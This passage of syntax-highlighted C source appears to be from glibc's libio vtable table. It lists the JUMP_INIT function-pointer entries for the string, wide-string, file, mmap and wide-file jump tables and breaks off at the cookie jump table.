    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_default_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_str_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_default_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_default_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_default_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_default_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_default_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_default_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_default_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_default_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_wstr_jumps  */</span>
  <span class="token punctuation">[</span>IO_WSTR_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_wstr_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">)</span> _IO_wstr_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wstr_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wdefault_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">)</span> _IO_wstr_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_wdefault_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_wdefault_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_wstr_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_default_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_default_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_wdefault_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_default_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_default_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_default_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_default_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_default_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_file_jumps  */</span>
  <span class="token punctuation">[</span>IO_FILE_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_file_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_file_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_new_file_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_new_file_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_new_file_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_new_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_file_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_file_jumps_mmap  */</span>
  <span class="token punctuation">[</span>IO_FILE_JUMPS_MMAP<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_file_underflow_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_new_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_file_xsgetn_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_file_seekoff_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">)</span> _IO_file_setbuf_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_file_sync_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_new_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_file_close_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_file_jumps_maybe_mmap  */</span>
  <span class="token punctuation">[</span>IO_FILE_JUMPS_MAYBE_MMAP<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> _IO_file_underflow_maybe_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> _IO_default_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> _IO_default_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_new_file_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_file_xsgetn_maybe_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_file_seekoff_maybe_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">)</span> _IO_file_setbuf_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> _IO_new_file_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_file_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_new_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_file_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_wfile_jumps  */</span>
  <span class="token punctuation">[</span>IO_WFILE_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_new_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">)</span> _IO_wfile_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wfile_underflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wdefault_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">)</span> _IO_wdefault_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_wfile_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_file_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_wfile_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_new_file_setbuf<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">)</span> _IO_wfile_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_wfile_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_new_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_file_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_wfile_jumps_mmap  */</span>
  <span class="token punctuation">[</span>IO_WFILE_JUMPS_MMAP<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_new_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">)</span> _IO_wfile_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wfile_underflow_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wdefault_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">)</span> _IO_wdefault_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_wfile_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_file_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_wfile_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_file_setbuf_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">)</span> _IO_wfile_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_wfile_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_new_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_file_close_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_wfile_jumps_maybe_mmap  */</span>
  <span class="token punctuation">[</span>IO_WFILE_JUMPS_MAYBE_MMAP<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_new_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>overflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">)</span> _IO_wfile_overflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>underflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wfile_underflow_maybe_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>uflow<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">)</span> _IO_wdefault_uflow<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>pbackfail<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">)</span> _IO_wdefault_pbackfail<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsputn<span class="token punctuation">,</span> _IO_wfile_xsputn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>xsgetn<span class="token punctuation">,</span> _IO_file_xsgetn<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekoff<span class="token punctuation">,</span> _IO_wfile_seekoff<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seekpos<span class="token punctuation">,</span> _IO_default_seekpos<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>setbuf<span class="token punctuation">,</span> _IO_file_setbuf_mmap<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>sync<span class="token punctuation">,</span> <span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">)</span> _IO_wfile_sync<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>doallocate<span class="token punctuation">,</span> _IO_wfile_doallocate<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>read<span class="token punctuation">,</span> _IO_file_read<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>write<span class="token punctuation">,</span> _IO_new_file_write<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>seek<span class="token punctuation">,</span> _IO_file_seek<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>close<span class="token punctuation">,</span> _IO_file_close<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>stat<span class="token punctuation">,</span> _IO_file_stat<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>showmanyc<span class="token punctuation">,</span> _IO_default_showmanyc<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>imbue<span class="token punctuation">,</span> _IO_default_imbue<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">/* _IO_cookie_jumps  */</span>
  <span class="token punctuation">[</span>IO_COOKIE_JUMPS<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    JUMP_INIT_DUMMY<span class="token punctuation">,</span>
    <span class="token function">JUMP_INIT</span> <span class="token punctuation">(</span>finish<span class="token punctuation">,</span> _IO_file_finish<span class="token punctuation">)</span><span class="token punctuation">,</span>
